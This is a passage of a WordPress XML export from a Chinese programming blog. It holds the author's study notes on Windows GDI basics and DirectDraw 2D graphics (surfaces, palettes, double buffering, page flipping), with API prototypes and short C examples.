		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Windows 编程一览（下）</title>
		<link>http://codemylife.blogcn.com/2011/10/windows-%e7%bc%96%e7%a8%8b%e4%b8%80%e8%a7%88%ef%bc%88%e4%b8%8b%ef%bc%89/</link>
		<pubDate>Tue, 11 Oct 2011 07:01:35 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[Windows]]></category>

		<category domain="tag" nicename="windows"><![CDATA[Windows]]></category>

		<category><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category domain="category" nicename="tricks-of-the-windows-game-progrmming"><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=125</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>RGB和调色板模式：</strong>
有两种表示方式用于显存中表示颜色，也就是直接方式和间接方式。直接色彩模式或者叫做RGB模式，以代表颜色的红、绿、蓝三原色的16、24 或32位来表示屏幕上的每个像素。

对于每一种可能的色深（16位、24位、32位），都有大量位被指定用给各个色彩通道。16位一共就有3种编码方式：RGB(6.5.5)、RGB(1.5.5.5)、RGB(5.6.5)，最后一种用的较普遍。

基本上说，RGB模式能够控制屏幕上每一个像素中红绿蓝的准确成分。调色板模式以间接（Indirection）方式工作。8位模式时使用一个调色板。

一个调色板（Palette）是一个由256项的表，每一项都是一个单字节值（0~255）。但是实际上每一个输入项都是由3个8位的红绿蓝构成的。当从8位颜色模式的屏幕上阅读到一个像素时，像素值用作颜色表的一个索引，然后从该索引地址读出24位RGB值并显示。通过这种办法，在同一时间屏幕上可以有256种不同的色彩，但是他们可以是来自于16.7百万色或24位RGB颜色值。

<strong>基本文本显示：</strong>
在实际游戏中，用GDI输出文本效率很低，一般都需要自己动手设计基于DirectX的文本引擎。在GDI中，文本输出有以下两个常用函数：
[c title="TextOut"]
BOOL TextOut(
  HDC hdc,           // handle to DC
  int nXStart,       // x-coordinate of starting position
  int nYStart,       // y-coordinate of starting position
  LPCTSTR lpString,  // character string
  int cbString       // number of characters
);
[/c]
和
[c title="DrawText"]
int DrawText(
  HDC hDC,          // handle to DC
  LPCTSTR lpString, // text to draw
  int nCount,       // text length
  LPRECT lpRect,    // formatting dimensions
  UINT uFormat      // text-drawing options
);
[/c]
另外几个函数用于设定文本前景色、背景色和透明度：
[c]
COLORREF SetTextColor(HDC hdc, COLORREF crColor);
COLORREF SetBkColor(HDC hdc, COLORREF crColor);
int SetBkMode(HDC hdc, int iBkMode);
[/c]
示例：
[c]
HDC hdc = GetDC(hwnd);
SetBkMode(hdc, TRANSPARENT);
SetTextColor(hdc, RGB(255,255,0));
TextOut(hdc, 20, 30, &quot;Hello&quot;, strlen(&quot;Hello&quot;));
ReleaseDC(hwnd, hdc);
[/c]

<strong>Window 操作：</strong>
Windows 发送大量的消息来通知程序用户已对其窗口进行了操作。一些消息如下：
[c title="消息"]
WM_ACTIVATE //当某个窗口被激活或者取消激活时发送。该消息首先被发送到被撤销的
            //最高级窗口的窗口程序中
WM_ACTIVATEAPP //当一个属于应用程序的非活动窗口正要激活时，向被激活和被取消的
            //的程序都发送此消息
WM_CLOSE    //当一个窗口或应用程序应当中止时发送此消息
WM_MOVE     //当窗口移动后发送
WM_MOVING   //发往用户正在移动的窗口
WM_SIZE     //在一个窗口改变大小后发往此消息
WM_SIZING   //发往用户正在改变大小的窗口
[/c]

<strong>键盘事件：</strong>
在Windows中，可以通过多种方式访问键盘消息：
<ul>
	<li>通过WM_CHAR消息</li>
	<li>通过WM_KEYDOWN 和 WM_KEYUP 消息</li>
	<li>通过调用 GetAsyncKeyState()</li>
</ul>
当按下键盘上的某个键（如A），将产生扫描码、ASCII码两个数据，其中ASCII码是人为形成的数据。

<strong>定时：</strong>
Windows定时器是一种输入设备，它周期性的每经过一个指定的时间间隔就发送 WM_TIMER 消息通知应用程序。Windows定时器建立硬件定时器之上。计时器消息 WM_TIMER 不是异步的。
[c title="使用SetTimer"]
//方式一 WM_TIMER消息发往窗口过程
case WM_CREATE:
    SetTimer(hwnd, nIDEvent, uElapse, NULL);
    return 0;
case WM_TIMER:
    //do your code here
    return 0;
//方式二 WM_TIMER消息发往回调函数
case WM_CREATE:
    SetTimer(hwnd, nIDEvent, uElapse, TimerProc);
    return 0;
//TimerProc函数原型
VOID CALLBACK TimerProc(HWND hwnd,UINT uMsg,UINT_PTR idEvent, DWORD dwTime);
//方式三 和方式二类似
case WM_CREATE:
    nID = SetTimer(NULL, nIDEvent, uElapse, NULL);
    return 0;
[/c]
在WM_DESTROY要调用 KillTimer 函数销毁定时器。Windows函数获取系统时间函数有GetLocalTime 和 GetSystemTime 函数。 Windows定时器的精确度不高，在10ms~20ms。高精度定时见<a href="http://codemylife.blogcn.com/2011/04/%E6%BC%AB%E8%AF%9D%E6%97%B6%E9%92%9F/">漫话时钟</a>。

<strong>获取信息：</strong>
获取正在使用的硬件信息，可以使用 GetSystemInfo 函数。所引用的结构：
[c]
typedef struct _SYSTEM_INFO {
    union {
        DWORD dwOemId;
        struct {
            WORD wProcessorArchitecture;
            WORD wReserved;
        };
    };
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
} SYSTEM_INFO;
[/c]
获取 Windows 和 Desktop 的所有信息函数：GetSystemMetrics；检索文本规格的函数：GetTextMetrics。


]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>125</wp:post_id>
		<wp:post_date>2011-10-11 15:01:35</wp:post_date>
		<wp:post_date_gmt>2011-10-11 07:01:35</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>windows-%e7%bc%96%e7%a8%8b%e4%b8%80%e8%a7%88%ef%bc%88%e4%b8%8b%ef%bc%89</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359014]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[18]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>初识DirectDraw</title>
		<link>http://codemylife.blogcn.com/2011/10/%e5%88%9d%e8%af%86directdraw/</link>
		<pubDate>Mon, 17 Oct 2011 10:16:24 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[DirectDraw]]></category>

		<category domain="tag" nicename="directdraw"><![CDATA[DirectDraw]]></category>

		<category><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category domain="category" nicename="tricks-of-the-windows-game-progrmming"><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=126</guid>
		<description></description>
		<content:encoded><![CDATA[天行健，君子以自强不息。——《周易》

最新的DirectX已近不再支持DirectDraw了，不过，如同在8086模式下学习汇编更容易理解一样，从DirectDraw开始学习2D游戏制作也将会受益匪浅吧！

<strong>接口特性</strong>
<ul>
	<li>IUnknown：所有 COM 对象都必须从这个接口生成。</li>
	<li>IDirectDraw：使用 DirectDraw 必须创建的主接口对象，IDirectDraw 一对一地表示视频卡及其支持硬件。</li>
	<li>IDirectDrawSurface：用 DirectDraw 创建、控制和现实的实际显示表面。DirectDraw 显示表面可以使用显存或者系统内存。基本上分为主显示表面和从显示表面。</li>
	<li>IDirectDrawPalette：DirectDraw 提供对 IDirectDrawPalette 接口的支持以使用256或更少的颜色在视频模式下处理调色板。</li>
	<li>IDirectDrawClipper：帮助剪切 DirectDraw 光栅和位图操作到一些可见显示表面的子集。大多数情况下，你只需要为窗口化的 DirectX 应用程序使用 DirectDraw 裁剪器，并裁剪位图操作到你显示的区域内，无论是主表面还是从表面。</li>
</ul>
<strong>获取DirectDraw接口</strong>

[c]
LPDIRECTDRAW lpdd = NULL;
HRESULT hr;
//获取 IDirectDraw1.0 接口
hr = DirectDrawCreate(NULL, &amp;lpdd, NULL);
TraceDxErr(hr, &quot;Create DirectDraw error!&quot;);
//获取 IDirectDraw7 接口
hr = lpdd-&gt;QueryInterface(IID_IDirectDraw7, (LPVOID*)&amp;g_lpdd);
TraceDxErr(hr, &quot;Query DirectDraw7 error!&quot;);
[/c]


或者

[c]
LPDIRECTDRAW lpdd = NULL;
HRESULT hr;
hr = DirectDrawCreateEx(NULL, (void **)&amp;lpdd, IID_IDirectDraw7, NULL));
TraceDxErr(hr, &quot;DirectDrawCreateEx error!&quot;);
[/c]


<strong>与Windows协作</strong>
设置 DirectDraw 的协作级别函数：

[c]
HRESULT SetCooperativeLevel(HWND hWnd, DWORD dwFlags);
[/c]


常用控制标记：

[c]
DDSCL_ALLOWMODEX  //允许使用Mode X (320*200，240， 400)显示模式。
DDSCL_ALLOWREBOOT //允许在排他（全屏）模式下检测Ctrl+Alt+Del
DDSCL_EXCLUSIVE	  //请求排他级别。须与 DDSCL_FULLSCREEN 同时使用
DDSCL_FULLSCREEN  //全屏模式。其他程序的GDI将不能写屏，须与DDSCL_EXCLUSIVE同时使用
DDSCL_NORMAL	  //窗口化程序
[/c]


<strong>设置模式</strong>

[c]
HRESULT SetDisplayMode( DWORD dwWidth, // width of mode in pixels
	DWORD dwHeight,	// height if mode in pixels
	DWORD dwBPP, 	// bits per pixel, 8,16,24,etc.
	DWORD dwRefreshRate,	//desired refresh, 0 for default
	DWORD dwflags,	// extra flags(advanced) 0 for default
);
[/c]


<strong>创建显示表面</strong>
显示在屏幕上的图像是某种格式存储在内存中的像素矩阵，或是调色板话的，或是RGB模式的。

主表面直接对应于被视频卡光栅化的显存，且在任何时候都是可见的。因此，在任何时候DirectDraw程序里你只能有一个主显示表面，直接指向屏幕图像并常驻 VRAM。

从表面可以是任意大小，可以驻留在VRAM 或系统内存中，可创建多个从表面。当你用一下动画帧更新这些离屏表面时，迅速拷贝或换页技术将离屏表面切换到主显示表面，可以达到平滑显示动画的目的。第二个重要用途是保存你的位图图像和游戏中表示对象的动画，因为只有DirectDraw显示表面才能调用使用于位图数据的硬件加速。

[c title="DDSURFACEDESC2"]
typedef struct _DDSURFACEDESC2
{
    DWORD		dwSize;		 // size of the DDSURFACEDESC structure
    DWORD		dwFlags;         // determines what fields are valid
    DWORD		dwHeight;        // height of surface to be created
    DWORD		dwWidth;         // width of input surface
    union
    {
        LONG 		lPitch;          // distance to start of next line (return value only)
        DWORD		dwLinearSize;    // Formless late-allocated optimized surface size
    } DUMMYUNIONNAMEN(1);
    union
    {
        DWORD		dwBackBufferCount// number of back buffers requested
        DWORD		dwDepth;         // the depth if this is a volume texture
    } DUMMYUNIONNAMEN(5);
    union
    {
        DWORD		dwMipMapCount;   // number of mip-map levels requestde
				         // dwZBufferBitDepth removed, use ddpfPixelFormat one instead
        DWORD		dwRefreshRate;   // refresh rate (used when display mode is described)
        DWORD		dwSrcVBHandle;   // The source used in VB::Optimize
    } DUMMYUNIONNAMEN(2);
    DWORD 		dwAlphaBitDepth; // depth of alpha buffer requested
    DWORD 		dwReserved;      // reserved
    LPVOID		lpSurface;       // pointer to the associated surface memory
    union
    {
        DDCOLORKEY	ddckCKDestOverlay// color key for destination overlay use
        DWORD     	dwEmptyFaceColor;// Physical color for empty cubemap faces
    } DUMMYUNIONNAMEN(3);
    DDCOLORKEY		ddckCKDestBlt;   // color key for destination blt use
    DDCOLORKEY		ddckCKSrcOverlay;// color key for source overlay use
    DDCOLORKEY		ddckCKSrcBlt;    // color key for source blt use
    union
    {
        DDPIXELFORMAT	ddpfPixelFormat; // pixel format description of the surface
        DWORD        	dwFVF;           // vertex format description of vertex buffers
    } DUMMYUNIONNAMEN(4);
    DDSCAPS2		ddsCaps;         // direct draw surface capabilities
    DWORD   		dwTextureStage;  // stage in multitexture cascade
} DDSURFACEDESC2;
[/c]


ddsCaps字段的一些常用属性：

[c]
DDSCAPS_BACKBUFFER	//表示该表面时一个平面翻转结构的后备缓冲
DDSCAPS_COMPLEX		//表示正在描述一个复杂表面，该表面拥有一个主显示缓冲
			//和一或多个后被缓冲以生成翻转链
DDSCAPS_FLIP		//表示该表面是平面翻转结构的一部分
DDSCAPS_OFFSCREENPLAIN	//表示显示表面时一个离屏表面，通常用于图元精灵（sprite）
DDSCAPS_PRIMARYSURFACE	//主显示表面
DDSCAPS_SYSTEMMEMORY	//显示表面内存从系统内存中分配
DDSCAPS_VIDEOMEMORY	//显示表面内存在显存中
[/c]

创建显示表面示例：
[c]
ZeroMemory(&amp;g_ddsd, sizeof(g_ddsd));
g_ddsd.dwSize = sizeof(g_ddsd);
g_ddsd.dwFlags = DDSD_CAPS | DDSD_BACKBUFFERCOUNT;
g_ddsd.dwBackBufferCount = 1;
g_ddsd.ddsCaps.dwCaps = DDSCAPS_PRIMARYSURFACE | DDSCAPS_COMPLEX
    | DDSCAPS_FLIP;
hr = g_lpdd-&gt;CreateSurface(&amp;g_ddsd, &amp;g_lpddPrimary, NULL);
TraceDxErr(hr, &quot;CreateSurface error!&quot;);
[/c]

<strong>绘制像素</strong>
要访问任何显示表面，必须对内存进行加锁和解锁，两个原因：首先，要告诉DirectDraw你已经控制内存；其次，要指示显示设备当你在操作锁住的内存时，他不能移动任何cache和虚拟内存缓冲区。

[c]
HRESULT Lock(
  LPRECT lpDestRect,
  LPDDSURFACEDESC lpDDSurfaceDesc,
  DWORD dwFlags,
  HANDLE hEvent
);
[/c]


常用dwFlags值：

[c]
DDLOCK_READONLY		//被锁住的显示表面时只读的
DDLOCK_SURFACEMEMORYPTR	//表示返回一个指向特定RECT顶部的内存指针
DDLOCK_WAIT		//如果当前不能获得锁，则重试直到获得锁
DDLOCK_WRITEONLY	//被锁住的显示表面时可写的
[/c]


Unlock用于解锁：

[c]
HRESULT Unlock(LPRECT lpRect);
[/c]


<span style="color: #ff0000;">2011/10/22添加：</span>

<strong>创建调色板</strong>
对于8位的色深，通常需要创建一个调色板，此时，DirectDraw有两个相关的函数：CreatePalette 和 SetPalette。

[c]
HRESULT CreatePalette(
    DWORD dwFlags,
    LPPALETTEENTRY lpDDColorArray,
    LPDIRECTDRAWPALETTE FAR *lplpDDPalette,
    IUnknown FAR *pUnkOuter
);
[/c]


常用的dwFlags如下：

[c]
DDPCAPS_8BIT		//8位色彩，最常用，包含256项
DDPCAPS_ALLOW256	//可以定义256项
DDPCAPS_PRIMARYSURFACE	//配置到主表面，改变调色板的色表，会立即显示
DDPCAPS_INITIALIZE	//调色板数据能被传递并下载到硬件调色板
[/c]


IDirectDrawSurface7::SetPalette 函数原型：

[c]
HRESULT SetPalette(
  LPDIRECTDRAWPALETTE FAR lpDDPalette
);
[/c]
一个查看调色板的例子：<a href="http://testsuit.blogcn.com/2011/10/%E6%9F%A5%E7%9C%8B%E8%B0%83%E8%89%B2%E6%9D%BF/">查看调色板</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>126</wp:post_id>
		<wp:post_date>2011-10-17 18:16:24</wp:post_date>
		<wp:post_date_gmt>2011-10-17 10:16:24</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%88%9d%e8%af%86directdraw</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358998]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[21]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>双缓冲和页面切换</title>
		<link>http://codemylife.blogcn.com/2011/10/%e5%8f%8c%e7%bc%93%e5%86%b2%e5%92%8c%e9%a1%b5%e9%9d%a2%e5%88%87%e6%8d%a2/</link>
		<pubDate>Wed, 19 Oct 2011 10:48:08 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[DirectDraw]]></category>

		<category domain="tag" nicename="directdraw"><![CDATA[DirectDraw]]></category>

		<category><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category domain="category" nicename="tricks-of-the-windows-game-progrmming"><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=130</guid>
		<description></description>
		<content:encoded><![CDATA[宝剑锋从磨砺出，梅花香自苦寒来。

继续学习DirectDraw。

<strong>获取像素格式</strong>
使用 IDirectDrawSurface7::GetPixelFormat 函数获取像素格式：

[c]
HRESULT GetPixelFormat(LPDDPIXELFORMAT lpDDPixelFormat);
[/c]


DDPIXELFORMAT 结构体成员详见：<a href="http://msdn.microsoft.com/en-us/library/gg426109">DDPIXELFORMAT structure</a>，常用的域有：

[c]
DWORD	dwSize;		//size of the structure, in bytes.
DWORD	dwFlags;	//flags to describe surface.
DWORD	dwRGBBitCount;	//RGB bits per pixel (4, 8, 16, 24, or 32).
[/c]


dwFlags常用的有效标识:

[c]
DDPF_PALETTEINDEXED8	//The surface is 8-bit color-indexed.
DDPF_RGB		//The RGB data in the pixel format structure is valid.
DDPF_ZBUFFER		//The pixel format describes a z-buffer surface.
[/c]


使用示例：

[c]
//获取像素格式
DDPIXELFORMAT pixelFormat;
memset(&amp;pixelFormat, 0, sizeof(pixelFormat));
pixelFormat.dwSize = sizeof(pixelFormat);
g_lpddPrimary-&gt;GetPixelFormat(&amp;pixelFormat);
//进行测试
if (pixelFormat.dwFlags &amp; DDPF_RGB) {
    //RGB mode, continue test BPP
}
else if (pixelFormat.dwFlags &amp; DDPF_PALETTEINDEXED8) {
    //256 color palettized mode
}
……
[/c]


<strong>双缓冲</strong>
在离屏缓冲中绘制图像，然后将其拷贝到显示表面的处理过程被称作双缓冲技术（Double Buffering）。

要实现双缓冲，你所需要完成的只是额外的分配一块同主 DirectDraw 表面同样尺寸的内存，并在这块内存上画每一帧动画之后<strong>拷贝</strong>双缓冲内存到主显示表面。

在《Windows 游戏编程大师技巧》中的示例7_4中，new 了一块内存，并将每帧数据都写好后，然后Copy到主表面。这里的Copy操作很耗时的，尤其是当主表面不是线性的时候，必须一行一行的Copy。之前曾以为，双缓冲是很高深的技术，结果了解之后，其实是很简单的，想来世间事物大多如此，所谓“知者易，不知者难”。

<strong>页面切换</strong>
页面切换（Page Filpping）技术类似于双缓冲技术，不过是在你画出下一帧备用的可见表面后，你直接操作硬件激活其他显示表面使其可见，这样就节省了内存拷贝的开销，因为硬件寻址系统直接将视频光栅指向了不同的内存部分。最后的结果是一个即时的页交换和可见的屏幕刷新。

要实现页面切换，首先得创建后备缓冲表面。<strong>后备缓冲</strong>是指一些用在动画链中的<strong>表面</strong>，它们具有和主表面相同的尺寸和色深。后备缓冲表面较特殊，因为当你创建主表面的时候也创建了它们，它们都是主表面也页面切换链中的环节。创建后备缓冲表面的目的是用 DirectDraw 的方式实现对双缓冲功能的仿真。

创建后备缓冲代码：

[c]
ZeroMemory(&amp;g_ddsd, sizeof(g_ddsd));
g_ddsd.dwSize = sizeof(g_ddsd);
g_ddsd.dwFlags = DDSD_CAPS | DDSD_BACKBUFFERCOUNT;
g_ddsd.dwBackBufferCount = 1;
g_ddsd.ddsCaps.dwCaps = DDSCAPS_PRIMARYSURFACE | DDSCAPS_COMPLEX
    | DDSCAPS_FLIP;
hr = g_lpdd-&gt;CreateSurface(&amp;g_ddsd, &amp;g_lpddPrimary, NULL);
TraceDxErr(hr, &quot;CreateSurface error!&quot;);
//后备缓冲区
g_ddsd.ddsCaps.dwCaps = DDSCAPS_BACKBUFFER;
hr = g_lpddPrimary-&gt;GetAttachedSurface(&amp;g_ddsd.ddsCaps, &amp;g_lpddBack);
[/c]


主要是第3、4、5、6行的设置，和第10、11行请求一个后备缓冲区。

然后就可以进行页面切换了，标准动画循环需要以下几个步骤：
<ol>
	<li>清除后备场景</li>
	<li>将场景渲染到后备缓冲</li>
	<li>用后备缓冲表面切换掉主表面</li>
	<li>锁定在某个帧率</li>
	<li>重复第1步</li>
</ol>

另，指向 VRAM 的指针是由硬件切换的，这样从编程人员和 DirectDraw 的观点来看，后备缓冲表面总是离屏的，而主表面总是可见的，所以你总在后备缓冲中进行绘制，并且每帧与主表面作切换。

涉及到的两个函数原型如下：
[c title="获取后备缓冲表面"]
HRESULT GetAttachedSurface(
    LPDDSCAPS2 lpDDSCaps,
    LPDIRECTDRAWSURFACE7 FAR *lplpDDAttachedSurface
);
[/c]
和
[c title="翻转表面"]
HRESULT Flip(
    LPDIRECTDRAWSURFACE7 lpDDSurfaceTargetOverride,
    DWORD dwFlags
);
[/c]

一般说来，dwFlags 只需设置为 DDFLIP_WAIT 就行了，同时，必须调用主表面对象的成员函数 Flip()，而不是后备缓冲的。注意，在切换页面前，主表面或者后备缓冲表面都必须解锁。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>130</wp:post_id>
		<wp:post_date>2011-10-19 18:48:08</wp:post_date>
		<wp:post_date_gmt>2011-10-19 10:48:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%8f%8c%e7%bc%93%e5%86%b2%e5%92%8c%e9%a1%b5%e9%9d%a2%e5%88%87%e6%8d%a2</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[8]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358990]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>blitter、裁剪和GDI</title>
		<link>http://codemylife.blogcn.com/2011/10/blitter%e3%80%81%e8%a3%81%e5%89%aa%e5%92%8cgdi/</link>
		<pubDate>Mon, 24 Oct 2011 04:37:14 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[DirectDraw]]></category>

		<category domain="tag" nicename="directdraw"><![CDATA[DirectDraw]]></category>

		<category><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category domain="category" nicename="tricks-of-the-windows-game-progrmming"><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=131</guid>
		<description></description>
		<content:encoded><![CDATA[纸上得来终觉浅，绝知此事要躬行。——陆游《冬夜读书示子律》

<strong>使用blitter</strong>
当采用主CPU进行内存填充时，主总线是传输的一部分；其次，组成表面的 VRAM 不一定是完全线性的，这时不得不一行一行的移动。 利用硬件 blitter 在 VRAM 内部移动位图，比起从系统内存移动到 VRAM 中要快得多。

DirectDraw 有两个用于显存块移动的函数：IDirectDrawSurface7::Blt 和 IDirectDrawSurface7::BltFast。

[c]
HRESULT Blt(
